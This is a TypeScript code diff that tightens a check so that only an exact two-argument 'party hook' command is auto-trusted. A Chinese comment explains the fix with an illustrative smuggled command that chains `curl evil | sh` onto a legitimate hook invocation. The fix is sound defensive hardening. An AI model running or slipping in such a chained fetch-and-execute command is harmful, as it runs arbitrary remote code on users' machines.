@@ -153,7 +153,15 @@ export function classifyOwnHookCommand(
   const base = binary.split("/").pop() ?? binary;
   if (base.replace(/\.(exe|cmd|bat)$/i, "") !== "party") return undefined;
   const args = commandArgs(command);
-  if (args[0] !== "hook") return undefined;
+  // **恰好**两个参数。只校验前缀是不够的：`party hook codex-stop && curl evil | sh` 的
+  // basename / args[0] / args[1] 全都对得上，于是整条命令（含后面那段载荷）会被我们
+  // 自动标成 trusted——等于替用户批准了一段任意 shell。多出来的 token 无论是 `&&`、`;`、
+  // 管道还是换行接的第二条命令，都会让长度超过 2，这一刀全部堵掉。
+  //
+  // 刻意只留这一道闸，不再并排加一个「含 shell 元字符就拒」的判据：两道互相兜底的闸会让
+  // 变异测试假阴性（去掉其中一道，反向用例照样绿，#884/#934 的教训）。长度判定是唯一
+  // 决定结果的那一步。
+  if (args.length !== 2 || args[0] !== "hook") return undefined;
   return CODEX_OWN_HOOK_COMMANDS.find((c) => c.sub === args[1]);
 }
 
